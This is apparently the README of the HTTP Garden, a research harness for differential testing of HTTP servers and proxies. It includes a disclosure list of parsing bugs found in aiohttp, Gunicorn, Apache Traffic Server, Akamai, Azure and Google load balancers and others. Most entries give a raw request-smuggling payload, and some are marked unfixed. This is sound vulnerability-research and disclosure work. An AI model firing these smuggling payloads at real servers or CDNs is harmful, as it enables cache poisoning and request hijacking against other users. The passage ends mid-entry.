# The HTTP Garden
The HTTP Garden is a collection of HTTP servers and proxies configured to be composable, along with scripts to interact with them in a way that makes finding vulnerabilities much much easier. For some cool demos of the stuff that you can find with the HTTP Garden, check out [our ShmooCon 2024 talk](https://invidious.slipfox.xyz/watch?v=aKPAX00ft5s&t=2h19m0s).

## Acknowledgements

We'd like to thank our friends at [Galois](https://galois.com), [Trail of Bits](https://www.trailofbits.com/), [Narf Industries](https://narfindustries.com/), and [Dartmouth College](https://web.cs.dartmouth.edu/) for making this project possible.

This material is based upon work supported by the Defense Advanced Research Projects Agency (DARPA) under contract number HR0011-19-C-0076.

## Getting Started

### Platform
The HTTP Garden runs on Linux, and is untested on other platforms. We make use of ASan, and due to [a bug in the way that ASan deals with ASLR](https://github.com/google/sanitizers/issues/1716#issuecomment-1902782650), you should either disable ASLR or [follow the advice here](https://github.com/google/sanitizers/issues/1716#issuecomment-1902782650) before starting the Garden.


### Dependencies
1. The HTTP Garden uses Docker, so you're going to have to install Docker.
2. You'll also need the following Python packages, which you can get from PyPI (i.e. with `pip`) or from your system package manager:
- `docker`
  - For interacting with Docker
- `pyyaml`
  - For parsing yaml
- `tqdm`
  - For progress bars

If you're installing Python packages with your system package manager, be aware that the package names may need to be prefixed with `py3-`, `python3-`, or `python-`, depending on the system.

3. I also highly recommend installing [rlwrap](https://github.com/hanslub42/rlwrap) from your package manager, because it makes the Garden repl a lot more fun.

### Building
- Build the base image:
```sh
docker build ./images/http-garden-soil -t http-garden-soil
```
This image contains some basic utilities, plus a forked AFL++ that facilitates collecting coverage from processes without killing them.

- Build some HTTP servers and proxies:
```sh
docker compose build gunicorn hyper nginx haproxy nginx_proxy
# This may take a few minutes, since it's compiling the targets from source.
```
There are, of course, way more targets in the HTTP garden than the ones we just built. It's just that building them all takes a long time.

### Running
- Start up some servers and proxies:
```sh
docker compose up gunicorn hyper nginx haproxy nginx_proxy
```
- Start the repl:
```sh
rlwrap python3 tools/repl.py
```
- Filter a basic GET request through [HAProxy](https://github.com/haproxy/haproxy), then through [Nginx](https://github.com/nginx/nginx) acting as a reverse proxy, then send the result to [Gunicorn](https://github.com/benoitc/gunicorn), [Hyper](https://github.com/hyperium/hyper/), and [Nginx](https://github.com/nginx/nginx), and display whether their interpretations match:
```
garden> payload 'GET / HTTP/1.1\r\nHost: whatever\r\n\r\n'
garden> transducers haproxy nginx_proxy; servers gunicorn hyper nginx
garden> transduce
[1]: 'GET / HTTP/1.1\r\nHost: whatever\r\n\r\n'
    ⬇️ haproxy
[2]: 'GET / HTTP/1.1\r\nhost: whatever\r\n\r\n'
    ⬇️ nginx_proxy
[3]: 'GET / HTTP/1.1\r\nHost: echo\r\nConnection: close\r\n\r\n'
garden> grid
         gunicorn hyper    nginx
gunicorn ✅       ✅       ✅
hyper    ✅       ✅       ✅
nginx    ✅       ✅       ✅
```
Seems like they all agree. Let's try a more interesting payload:
```
garden> payload 'POST / HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: chunked\r\n\r\n0\n\r\n'
garden> grid
         gunicorn hyper    nginx
gunicorn ✅       ✅       ❌
hyper    ✅       ✅       ❌
nginx    ❌       ❌       ✅
```
There's a discrepancy! This is because Nginx supports `\n` as a line ending in chunk lines, but Hyper and Gunicorn don't. Nginx is technically violating RFC 9112 here, but the impact is likely minimal.

## Directory Layout
### `images`
The `images` directory contains a subdirectory for each HTTP server and transducer in the Garden.
Each target gets its own Docker image. All programs are built from source inside Docker images based on Debian Bookworm when possible. So that we can easily build multiple versions of each target, nearly all targets have an `APP_VERSION` build argument which can usually be set to any tag, branch, or commit hash from the project's repository.

### `tools`
The `tools` directory contains the scripts that are used to interact with the servers.

## Containers

### HTTP Servers
| Name        | Version      | Traced? |
| ----------- | ------------ | ------- |
| aiohttp     | master       | yes     |
| apache      | trunk        | yes     |
| bun         | main         | no      |
| cherrypy    | main         | no      |
| daphne      | main         | yes     |
| deno        | main         | no      |
| fasthttp    | master       | no      |
| go_net_http | master       | no      |
| gunicorn    | master       | no      |
| h2o         | master       | yes     |
| hyper       | master       | no      |
| hypercorn   | main         | no      |
| jetty       | jetty-12.0.x | no      |
| libevent    | master       | no      |
| lighttpd    | master       | yes     |
| mongoose    | master       | yes     |
| nginx       | default      | yes     |
| nodejs      | main         | no      |
| ols         | 1.7.19       | no      |
| passenger   | stable-6.0   | no      |
| puma        | master       | no      |
| tomcat      | main         | no      |
| tornado     | master       | yes     |
| uhttpd      | master       | yes     |
| unicorn     | master       | no      |
| uvicorn     | master       | yes     |
| waitress    | main         | yes     |
| webrick     | master       | no      |
| werkzeug    | main         | no      |

### HTTP Proxies
| Name         | Version |
| ------------ | ------- |
| apache_proxy | trunk   |
| ats          | master  |
| caddy_proxy  | master  |
| h2o_proxy    | master  |
| haproxy      | master  |
| nghttpx      | master  |
| nginx_proxy  | default |
| ols_proxy    | 1.7.19  |
| pound        | master  |
| squid        | master  |
| varnish      | master  |

### WIP/Unused Targets
| Name                | Reason                                                   |
| ------------------- | -------------------------------------------------------- |
| beast               | Resource leak in harness                                 |
| mako                | Can't figure out how to read an arbitrary message body.  |
| nghttp2             | Only speaks HTTP/2                                       |
| thin                | Doesn't understand chunked bodies                        |
| uwsgi               | Doesn't understand chunked bodies                        |
| nginx_unit          | I don't remember                                         |
| civetweb            | WIP                                                      |
| caddy               | Uses Go net/http under the hood                          |
| daedalus            | Really slow to build and requires an annoying script     |
| wsgiref             | Wasn't responding to requests from outside the container |
| envoy               | Takes 10,000 years to build                              |
| traefik             | Long build times; uses Go net/http under the hood        |

### External Targets
If you have external services (probably CDNs) that you want to add to the Garden, we do support that. See the bottom of `docker-compose.yml` for some more details on that. We have removed references to our CDN deployments because we don't want you all racking up our bill :)

## Trophies
These are the bugs we've found using the HTTP Garden. If you find some of your own, please submit a PR to add them to this list!
Each bug is described with the following fields:
  - Use case: The type of attack an attacker can execute with this bug
  - Requirements: Required configuration options or other servers in order for this bug to be exploited.
  - Risk: None|Low|Medium|High, followed by a short explanation.
    - None: The bug is likely not exploitable.
    - Low: The bug might be exploitable, but it requires a really weird config or would rely on a proxy behaving in a way that I've never seen.
    - Medium: The bug is likely exploitable, but has only moderate impact or requires an unlikely server/transducer combination.
    - High: The bug is exploitable in common configurations and server/transducer combinations.
  - Payload: An example payload that triggers the bug
  - Timeline: Timeline of events relating to the bug

### AIOHTTP
1. The Python `int` constructor is used to parse `Content-Length`s and chunk-sizes, so `_`, `+`, and `-` are misinterpreted.
  - Use case: Request smuggling
  - Requirements: A transducer that interprets `Content-Length`s or chunk-sizes as their longest valid prefix, but forwards them as-is.
  - Risk: Medium. See Apache Traffic Server bug 5.
  - Payload: `GET / HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: chunked\r\n\r\n0_2e\r\n\r\nGET / HTTP/1.1\r\nHost: a\r\nContent-Length: 5\r\n\r\n0\r\n\r\n`
  - Timeline:
    - August 1, 2023: Reported via [GH security advisory](https://github.com/aio-libs/aiohttp/security/advisories/GHSA-gfw2-4jvh-wgfg).
    - October 7, 2023: Fixed in [release 3.8.6](https://github.com/aio-libs/aiohttp/releases/tag/v3.8.6).
2. `\x00`, `\r`, and `\n` are incorrectly permitted in header values.
  - Use case: Request smuggling
  - Requirements: A transducer that accepts and forwards bare `\n` as a header line terminator.
  - Risk: High. See OpenLiteSpeed bug 14.
  - Payload: `GET / HTTP/1.1\r\nHost: a\r\nHeader: v\n\x00\ralue\r\n\r\n`
  - Timeline:
    - August 1, 2023: Reported via [GH security advisory](https://github.com/aio-libs/aiohttp/security/advisories/GHSA-gfw2-4jvh-wgfg).
    - October 7, 2023: Fixed in [release 3.8.6](https://github.com/aio-libs/aiohttp/releases/tag/v3.8.6).
3. Whitespace is incorrectly stripped from the ends of header names.
  - Use case: Request smuggling
  - Requirements: A transducer that considers whitespace before the `:` to be part of the header name.
  - Risk: Low. I'm not aware of any vulnerable transducers, but James Kettle [says that at least one exists](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn).
  - Payload: `GET / HTTP/1.1\r\nHost: whatever\r\nContent-Length : 34\r\n\r\nGET / HTTP/1.1\r\nHost: whatever\r\n\r\n`
  - Timeline:
    - August 2, 2023: Reported via [GH security advisory](https://github.com/aio-libs/aiohttp/security/advisories/GHSA-gfw2-4jvh-wgfg).
    - October 7, 2023: Fixed in [release 3.8.6](https://github.com/aio-libs/aiohttp/releases/tag/v3.8.6).
4. Whitespace is incorrectly stripped from the beginning of the first header name.
  - Use case: Request smuggling
  - Requirements: A transducer that considers whitespace at the beginning of the first header name to be part of the header name.
  - Risk: Low. I'm not aware of any vulnerable transducers.
  - Payload: `GET / HTTP/1.1\r\n\tContent-Length: 1\r\n\r\nX`
  - Timeline:
    - August 20, 2023: Reported via GH security advisory [comment](https://github.com/aio-libs/aiohttp/security/advisories/GHSA-gfw2-4jvh-wgfg#advisory-comment-86438).
    - October 7, 2023: Fixed in [release 3.8.6](https://github.com/aio-libs/aiohttp/releases/tag/v3.8.6).
5. HTTP versions are interpreted as their longest valid prefix.
  - Use case: ???
  - Requirements: N/A
  - Risk: None
  - Payload: `GET /test HTTP/1.32\r\n\r\n`
  - Timeline:
    - October 14, 2023: Reported via [GH issue](https://github.com/aio-libs/aiohttp/issues/7700) and [PR](https://github.com/aio-libs/aiohttp/pull/7701).
    - October 15, 2023: Fixed in [commit](https://github.com/aio-libs/aiohttp/commit/312f747de91f20fa33af03fd368f857fbd32f36a).
6. HTTP methods are interpreted as their longest valid prefix.
  - Use case: ???
  - Requirements: N/A
  - Risk: None
  - Payload: `G=":<>(e),[T];?" /get HTTP/1.1\r\n\r\n`
  - Timeline:
    - October 14, 2023: Reported via [GH issue](https://github.com/aio-libs/aiohttp/issues/7700) and [PR](https://github.com/aio-libs/aiohttp/pull/7701).
    - October 15, 2023: Fixed in [commit](https://github.com/aio-libs/aiohttp/commit/312f747de91f20fa33af03fd368f857fbd32f36a).
7. URIs are not validated.
  - Use case: ???
  - Requirements: N/A
  - Risk: None
  - Payload: `GET ! HTTP/1.1\r\n\r\n`
  - Timeline:
    - October 16, 2023: Reported via [GH issue](https://github.com/aio-libs/aiohttp/issues/7712).
    - October 16, 2023: Fixed in [PR](https://github.com/aio-libs/aiohttp/pull/7713).
8. `\x80-\xff` are allowed in header names.
  - Use case: ???
  - Requirements: N/A
  - Risk: None
  - Payload: `GET / HTTP/1.1\r\n\xffoo: bar\r\n\r\n`
  - Timeline:
    - October 17, 2023: Reported via [PR](https://github.com/aio-libs/aiohttp/pull/7719).
    - October 18, 2023: Fixed via merge of above PR.
9. `\n` is allowed as separating whitespace in a request line.
  - Use case: Request smuggling
  - Requirements: A transducer that forwards HTTP/0.9 requests with bare `\n` as-is, and reuses the underlying connection.
  - Risk: Low. I'm not aware of any vulnerable transducers.
  - Payload: `GET /\nHTTP/1.1\r\n\r\n`
  - Timeline:
    - October 17, 2023: Reported via [PR](https://github.com/aio-libs/aiohttp/pull/7719).
    - October 18, 2023: Fixed via merge.

### Akamai CDN
1. `0x`-prefixed `Content-Length` values are incorrectly accepted and forwarded, without validation of the message body.
  - Use case: Request smuggling
  - Requirements: A server that either interprets `Content-Length` as its longest valid prefix, or interprets `0x`-prefixed `Content-Length`.
  - Risk: Medium. See Mongoose bug 5 and OLS bug 3.
  - Payload: `POST / HTTP/1.1\r\nHost: akamai.my-domain.cool\r\nContent-Length: 0x10\r\n\r\nZ`
  - Timeline:
    - September 7, 2023: Reported via email.
    - November 27, 2023: Notified of fix via email.
2. Invalid chunk-size values are incorrectly accepted and forwarded.
  - Use case: Request smuggling
  - Requirements: An HTTP/1.1 backend server
  - Risk: High. This bug was exploitable for request smuggling against arbitrary backends.
  - Payload: `POST / HTTP/1.1\r\nHost: akamai.my-domain.cool\r\nTransfer-Encoding: chunked\r\n\r\nZ\r\nZZ\r\nZZZ\r\n\r\n`
  - Timeline:
    - September 7, 2023: Reported via email.
    - November 27, 2023: Notified of fix via email.
3. `\r` is incorrectly permitted in chunk-ext whitespace before the `;`.
  - Use case: Request smuggling
  - Requirements: A server that misinterprets `\r` in this location.
  - Risk: High. See Node.js bug 2.
  - Payload: `POST / HTTP/1.1\r\nHost: server.my-domain.cool\r\nTransfer-Encoding: chunked\r\n\r\n2\r\r;a\r\n02\r\n41\r\n0\r\n\r\nGET /bad_path/pwned HTTP/1.1\r\nHost: a\r\nContent-Length: 430\r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: server.my-domain.cool\r\n\r\n`
  - Timeline:
    - September 7, 2023: Reported via email.
    - November 27, 2023: Notified of fix via email.
4. REDACTED
  - Use case: Request smuggling
  - Requirements: REDACTED
  - Risk: High. REDACTED
  - Payload: REDACTED
  - Timeline:
    - December 3, 2023: Reported via email.
    - January 30, 2024: Remains unfixed.

### Apache httpd
1. NULL argument passed to `memcpy` in `apr_brigade_flatten` triggers undefined behavior in `mod_proxy_fcgi`.
  - Use case: ???
  - Requirements: N/A
  - Risk: None
  - Payload: Any request with an empty message body that will be forwarded to a proxy_fcgi backend.
  - Timeline:
    - December 2, 2023: Reported via [Bugzilla issue](https://bz.apache.org/bugzilla/show_bug.cgi?id=68278).
    - December 19, 2023: Fixed in [revision 1914775](https://svn.apache.org/viewvc?view=revision&revision=1914775).

### Apache Traffic Server
1. When ATS is configured with the `attach_server_session_to_client` option, and has a Puma server as its backend, it segfaults when proxying any request.
  - Use case: DoS
  - Requirements: The server uses `attach_server_session_to_client`
  - Risk: Low. While this does crash ATS, it's so easy to notice that a reasonable person would not have deployed a vulnerable instance in production.
  - Payload: Any request at all.
  - Timeline:
    - July 31, 2023: Reported via [GH issue](https://github.com/apache/trafficserver/issues/10116).
    - September 13, 2023: Fixed via [PR](https://github.com/apache/trafficserver/pull/10399).
2. Empty `Content-Length` headers are incorrectly forwarded.
  - Use case: Request smuggling
  - Requirements: A server that interprets empty `Content-Length` values as anything other than 0
  - Risk: Medium. See Puma bug 1.
  - Payload: `GET / HTTP/1.1\r\nhost: whatever\r\ncontent-length: \r\n\r\n`
  - Timeline:
    - August 2, 2023: Reported via [GH issue](https://github.com/apache/trafficserver/issues/10137#issue-1833493999).
    - August 6, 2023: Fixed via [PR](https://github.com/apache/trafficserver/pull/10144).
3. Invalid characters are allowed in header names, which can lead to request smuggling under certain conditions. The invalid characters are `\t`, ` `, `"`, `(`, `)`, `,`, `/`, `;`, `<`, `=`, `>`, `?`, `@`, `[`, `\`, `]`, `{`, `}`, and the entire range from `\x80` to `\xff`.
  - Use case: Request smuggling
  - Requirements: A server that misinterprets these invalid bytes.
  - Risk: Medium. See Gunicorn bug 3.
  - Payload: `GET / HTTP/1.1\r\nHost: fanout\r\nHeader\x85: value\r\n\r\n`
  - Timeline:
    - June 29, 2023: Reported via email.
    - September 18, 2023: Reported via [GH issue](https://github.com/apache/trafficserver/issues/10459).
    - January 31, 2024: Remains unfixed.
4. Carriage returns are forwarded within chunk-ext BWS.
  - Use case: Request smuggling
  - Requirements: A server that misinterprets `\r` in this location.
  - Risk: High. See Node.js bug 2.
  - Payload: `POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n1\r\r;chunk-ext-name\r\nZ\r\n0\r\n\r\n`
  - Timeline:
    - September 20, 2023: Reported via [GH issue](https://github.com/apache/trafficserver/issues/10477).
    - January 31, 2024: Remains unfixed.
5. Chunk-sizes are interpreted as their longest valid prefix, and re-emitted.
  - Use case: Request smuggling
  - Requirements: A server that interprets `0_` or `0x` prefixes on chunk-sizes.
  - Risk: High. See Tornado bug 1, AIOHTTP bug 1, Gunicorn bug 4, Libevent bug 2, OpenLiteSpeed bug 8, OpenBSD relayd bug 3, and Pound bug 2.
  - Payload: `POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n1these-bytes-never-get-validated\r\nZ\r\n0\r\n\r\n`
  - Timeline:
    - October 10, 2023: Reported via [GH issue](https://github.com/apache/trafficserver/issues/10580).
    - January 31, 2024: Remains unfixed.
6. `Content-Length` values are not validated when a `Transfer-Encoding: chunked` header is present.
  - Use case: ???
  - Requirements: N/A
  - Risk: None.
  - Payload: `POST / HTTP/1.1\r\nHost: a\r\nContent-Length: blahblahblah\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\n0\r\n\r\n`
  - Timeline:
    - February 3, 2024: Reported via [GH issue](https://github.com/apache/trafficserver/issues/11036).
    - Feburary 3, 2024: Remains unfixed.

### Azure CDN
1. `Transfer-Encoding: ,chunked` headers are forwarded intact.
  - Use case: Request smuggling
  - Requirements: A server that both ignores unknown `Transfer-Encoding`s and treats `,chunked` as distinct from `chunked`.
  - Risk: High. See Gunicorn bug 6, Mongoose bug 4, OpenBSD relayd bug 2, and Phusion Passenger bug 1.
  - Payload: `POST / HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: ,chunked\r\n\r\n0\r\n\r\n`
  - Timeline:
    - October 15, 2023: Reported via [MSRC vulnerability report](https://msrc.microsoft.com/report/vulnerability/VULN-110915).
    - November 29, 2023: Fixed on or before this date.
    - December 12, 2023: "this case does not meet the bar for servicing by MSRC as HTTP smuggling is not consider a vulnerability and we will be closing this case."

### Bun
1. Header names containing any of ``!#$%&'*+.^_`|~`` are incorrectly rejected.
  - Use case: ???
  - Requirements: N/A
  - Risk: None
  - Payload: `GET / HTTP/1.1\r\nHost: a\r\nTe!st: a\r\n\r\n`
  - Timeline:
    - October 12, 2023: Reported via [GH issue](https://github.com/oven-sh/bun/issues/6462).
    - January 31, 2024: Remains unfixed.
2. The connection is closed without an error response when a message containing no `Host` header is received.
  - Use case: ???
  - Requirements: N/A
  - Risk: None
  - Payload: `GET / HTTP/1.1\r\n\r\n`
  - Timeline:
    - February 2, 2024: Reported via [GH issue](https://github.com/oven-sh/bun/issues/8648).
    - February 2, 2024: Remains unfixed.

### CherryPy
1. Whitespace is stripped from the ends of header names, before the `:`.
  - Use case: Request smuggling
  - Requirements: A transducer that considers whitespace before the `:` to be part of the header name.
  - Risk: Low. I'm not aware of any vulnerable transducers, but James Kettle [says that at least one exists](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn).
  - Payload: `GET / HTTP/1.1\r\nHost: whatever\r\nContent-Length : 34\r\n\r\nGET / HTTP/1.1\r\nHost: whatever\r\n\r\n`
  - Timeline:
    - February 4, 2024: Reported via [GH issue](https://github.com/cherrypy/cherrypy/issues/2016).
    - February 4, 2024: Remains unfixed.

### CPython http.server
1. The `Content-Length` header value is parsed permissively, allowing digit-separating underscores and a `+` prefix.
  - Use case: Request smuggling
  - Requirements: A transducer that interprets `Content-Length` values as their longest valid prefix, but forwards them as-is.
  - Risk: Low. I'm not aware of any vulnerable transducers, but Matt Grenfeldt [says that at least one exists](https://grenfeldt.dev/2021/10/08/gunicorn-20.1.0-public-disclosure-of-request-smuggling/).
  - Payload: `GET / HTTP/1.1\r\nHost: a\r\nContent-Length: +1_0\r\n\r\n0123456789`
  - Timeline:
    - April 2, 2023: Reported via [GH issue](https://github.com/python/cpython/issues/103204).
    - April 2, 2023: Fixed in commits [cf720ac](https://github.com/python/cpython/commit/cf720acfcbd8c9c25a706a4b6df136465a803992) and [cf720ac](https://github.com/python/cpython/commit/b4c1ca29ccd45c608ff01ce0a4608b1837715573).
2. `\r` is treated as a line terminator in header field lines.
  - Use case: Request smuggling
  - Requirements: A transducer that forwards `\r` in header names.
  - Risk: High. See Google Cloud Classic Application Load Balancer bug 1, and OpenLiteSpeed bug 6.
  - Payload: `GET / HTTP/1.1\r\nVisible: :/\rSmuggled: :)\r\n\r\n`
  - Timeline:
    - January 31, 2024: Reported via [GH issue](https://github.com/python/cpython/issues/114782).
    - January 31, 2024: Remains unfixed.

### Daphne
1. Numerous disallowed characters are incorrectly permitted in header names.
  - Use case: ???
  - Requirements: N/A
  - Risk: None
  - Payload: `GET / HTTP/1.1\r\n\x00\x01\x02\x03\x04\x05\x06\x07\x08\t\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f "(),/;<=>?@[/]{}\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef: whatever\r\n\r\n`
  - Timeline:
    - February 4, 2024: Reported via [GH issue](https://github.com/django/daphne/issues/497).
    - February 4, 2024: Remains unfixed.

### Envoy
1. Whitespace characters are not stripped from field values during HTTP/2 to HTTP/1.1 downgrades.
  - Use case: ???
  - Requirements: N/A
  - Risk: None
  - Payload: `PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00E\x01\x05\x00\x00\x00\x01\x00\n:authority\tlocalhost\x00\x05:path\x01/\x00\x07:method\x03GET\x00\x07:scheme\x04http\x00\x05test1\x03\ta\t`
  - Timeline:
    - July 7, 2023: Reported via [GH issue](https://github.com/envoyproxy/envoy/issues/28285).
    - October 7, 2023: Remains unfixed.

### FastHTTP
1. REDACTED
  - Use case: Request smuggling
  - Requirements: REDACTED
  - Risk: Medium. REDACTED
  - Payload: REDACTED
  - Timeline:
    - February 4, 2024: Reported via email.
    - February 4, 2024: Remains unfixed.
2. REDACTED
  - Use case: Request smuggling
  - Requirements: REDACTED
  - Risk: Medium. REDACTED
  - Payload: REDACTED
  - Timeline:
    - February 4, 2024: Reported via email.
    - February 4, 2024: Remains unfixed.
3. HTTP versions are not validated.
  - Use case: ???
  - Requirements: N/A
  - Risk: None
  - Payload: `GET / HTTP/\r\r1.1\r\n\r\n`
  - Timeline:
    - February 4, 2024: Reported via [GH issue](https://github.com/valyala/fasthttp/issues/1703).
    - February 4, 2024: Remains unfixed.

### Go net/http
1. Empty `Content-Length` values are treated as though they were `0`.
  - Use case: Request smuggling
  - Requirements: A transducer that interprets empty `Content-Length` values as anything other than 0.
  - Risk: Low. I'm not aware of any such transducer.
  - Payload: `GET / HTTP/1.1\r\nHost: whatever\r\nContent-Length: \r\n\r\n`
  - Timeline:
    - July 31, 2023: Reported via [GH issue](https://github.com/golang/go/issues/61679)
    - August 11, 2023: Fixed in [commit](https://github.com/golang/go/commit/610d47a584e780f4af7978904c4c162de7ceee0b).
2. Empty chunk-size values are treated as though they were `0`.
  - Use case: Request smuggling
  - Requirements: A transducer that accepts and forwards extra `\r\n`s between chunks.
  - Risk: Low. I'm not aware of any such transducer.
  - Payload: `GET / HTTP/1.1\r\nHost: whatever\r\nTransfer-Encoding: chunked\r\n\r\n\r\n\r\n`
  - Timeline:
    - December 2, 2023: Reported via [GH issue](https://github.com/golang/go/issues/64517).
    - January 4, 2024: Fixed in [commit](https://github.com/golang/go/commit/ead47b0ab39c5819aee207cda536531a8e44ddc7).
3. Empty header names are erroneously accepted.
  - Use case: Request smuggling
  - Requirements: A transducer that accepts and forwards `\r\n:\r\n`, and treats it as the end of the header block.
  - Risk: Low. I'm not aware of any such transducer.
  - Payload: `GET / HTTP/1.1\r\n: ignored\r\nHost: whatever\r\n\r\n`
  - Timeline:
    - January 24, 2024: Reported via [GH issue](https://github.com/golang/go/issues/65244).
    - January 30, 2024: Fixed in [commit](https://github.com/golang/go/commit/ae457e811d44261801bda261731b5006d629930d).
4. `Content-Length` values are not validated when a `Transfer-Encoding: chunked` header is present.
  - Use case: ???
  - Requirements: N/A
  - Risk: None.
  - Payload: `POST / HTTP/1.1\r\nHost: a\r\nContent-Length: blahblahblah\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\n0\r\n\r\n`
  - Timeline:
    - February 3, 2024: Reported via [GH issue](https://github.com/golang/go/issues/65505).
    - Feburary 3, 2024: Remains unfixed.

### Google Cloud Classic Application Load Balancer
1. `\r` is incorrectly forwarded in header values.
  - Use case: Request smuggling
  - Requirements: A server that treats `\r` as equivalent to `\r\n` within header fields.
  - Risk: Medium. See Mongoose bug 3 and CPython http.server bug 2.
  - Payload: `GET / HTTP/1.1\r\nInvalid-Header: this\rvalue\ris\rinvalid\r\n\r\n`
  - Timeline:
    - September 7, 2023: Reported via [Google IssueTracker](https://issuetracker.google.com/issues/299469787).
    - January 30, 2024: Fixed on or before this date.
2. `\r` is incorrectly forwarded in the whitespace before a chunk-ext.
  - Use case: Request smuggling
  - Requirements: A server that misinterprets `\r` in this location.
  - Risk: High. See Node.js bug 2.
  - Payload: `POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n2\r\r;a\r\n02\r\n38\r\n0\r\n\r\nGET /bad_path/pwned HTTP/1.1\r\nContent-Length: 253\r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\n\r\n`
  - Timeline:
    - September 13, 2023: Reported via [Google IssueTracker](https://issuetracker.google.com/issues/300252322).
    - January 30, 2024: Fixed on or before this date.

### Gunicorn
1. The Python `int` constructor is used to parse `Content-Length` values, so `0x`, `_`, `+`, and `-` are misinterpreted.
  - Use case: Request smuggling
  - Requirements: A transducer that interprets `Content-Length` values as their longest valid prefix, but forwards them as-is.
  - Risk: Low. I'm not aware of any vulnerable transducers, but Matt Grenfeldt [says that at least one exists](https://grenfeldt.dev/2021/10/08/gunicorn-20.1.0-public-disclosure-of-request-smuggling/).
  - Payload: `GET / HTTP/1.1\r\nHost: a\r\nContent-Length: +1_0\r\n\r\n0123456789`
  - Timeline:
    - May 5, 2023: Reported via [GH issue](https://github.com/benoitc/gunicorn/issues/2977).
    - July 10, 2023: Fixed in [commit cc2e383](https://github.com/benoitc/gunicorn/commit/cc2e3835784542e65886cd27f64d444309fbaad0).
2. Gunicorn strips all non-`\r\n` whitespace sequences from the beginnings of header values (after the `:`). Thus, when Gunicorn encounters a header prefixed with `\n\n`, Gunicorn sees one request where many servers see two.
  - Use case: Request smuggling
  - Requirements: A transducer that accepts and forwards bare `\n` line endings in field lines.
  - Risk: Medium. See OpenLiteSpeed bug 14.
  - Payload: `GET / HTTP/1.1\r\nHost: a\r\nUseless:\n\nGET / HTTP/1.1\r\n\r\n`
  - Timeline:
    - June 2, 2023: Reported via email.
    - January 31, 2024: Reported via [GH issue](https://github.com/benoitc/gunicorn/issues/3144).
    - January 31, 2024: Remains unfixed.
3. Gunicorn strips `\xa0` and `\x85` bytes from the ends of header names (before the `:`). This allows for request smuggling.
  - Use case: Request smuggling
  - Requirements: A transducer that accepts and forwards `\xa0` or `\x85`, and treats it as a normal character.
  - Risk: Medium. See Apache Traffic Server bug 3.
  - Payload: `GET / HTTP/1.1\r\nHost: a\r\nContent-Length\x85: 10\r\n\r\n0123456789`
  - Timeline:
    - June 27, 2023: Reported via email.
    - December 25, 2023: Fixed in [commit](https://github.com/benoitc/gunicorn/commit/0b4c93952723d917d50de09d9c8e43e000a35ccd).
4. The Python `int` constructor is used to parse chunk-sizes, so `0x`, `_`, `+`, and `-` are misinterpreted.
  - Use case: Request smuggling
  - Requirements: A transducer that interprets chunk-size values as their longest valid prefix, but forwards them as-is.
  - Risk: Medium. See Apache Traffic Server bug 5.
  - Payload: `GET / HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: chunked\r\n\r\n0x2_e\r\n\r\nGET / HTTP/1.1\r\nHost: a\r\nContent-Length: 5\r\n\r\n0\r\n\r\n`
  - Timeline:
    - August 1, 2023: Reported via [GH issue](https://github.com/benoitc/gunicorn/issues/3047).
    - December 25, 2023: Fixed in [commit](https://github.com/benoitc/gunicorn/commit/0b4c93952723d917d50de09d9c8e43e000a35ccd).
5. `\x00`, `\r`, and `\n` are erroneously permitted in header values.
  - Use case: Request smuggling
  - Requirements: A transducer that forwards bare `\n` line endings as-is.
  - Risk: Medium. See OpenLiteSpeed bug 14.
  - Payload: `GET / HTTP/1.1\r\nHost: a\r\nTest: x\n\r\x00\r\n\r\n`
  - Timeline:
    - January 31, 2024: Reported via [GH issue](https://github.com/benoitc/gunicorn/issues/3144).
    - January 31, 2024: Remains unfixed.
6. Gunicorn treats `,chunked` as not equal to `chunked`.
  - Use case: Request smuggling
  - Requirements: A transducer that forwards the `Transfer-Encoding` value `,chunked` as-is, and interprets it as equivalent to `chunked`.
  - Risk: High. See Azure CDN bug 1 and nghttpx bug 1.
  - Payload: `GET / HTTP/1.1\r\nHost: whatever\r\nTransfer-Encoding: ,chunked\r\nContent-Length: 5\r\n\r\n0\r\n\r\n`
  - Timeline:
    - November 6, 2023: Reported via [GH issue](https://github.com/benoitc/gunicorn/issues/3087).
    - December 25, 2023: Fixed in [commit](https://github.com/benoitc/gunicorn/commit/0b4c93952723d917d50de09d9c8e43e000a35ccd).
7. Gunicorn allows empty header names.
  - Use case: Request smuggling
  - Requirements: A transducer that accepts and forwards `\r\n:\r\n`, and treats it as the end of the header block.
  - Risk: Low. I'm not aware of any such transducer.
  - Payload: `GET / HTTP/1.1\r\n: a\r\n\r\n`
  - Timeline:
    - December 4, 2023: Reported via [GH issue](https://github.com/benoitc/gunicorn/issues/3104).
    - December 25, 2023: Fixed in [commit](https://github.com/benoitc/gunicorn/commit/0b4c93952723d917d50de09d9c8e43e000a35ccd).

### H2O
1. Whitespace characters are not stripped during HTTP/2 to HTTP/1.1 translation.
  - Use case: ???
  - Requirements: H2O is acting as a transducer to an HTTP/1.1 backend.
  - Risk: None
  - Payload: `PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00E\x01\x05\x00\x00\x00\x01\x00\n:authority\tlocalhost\x00\x05:path\x01/\x00\x07:method\x03GET\x00\x07:scheme\x04http\x00\x05test1\x03\ta\t`
  - Timeline:
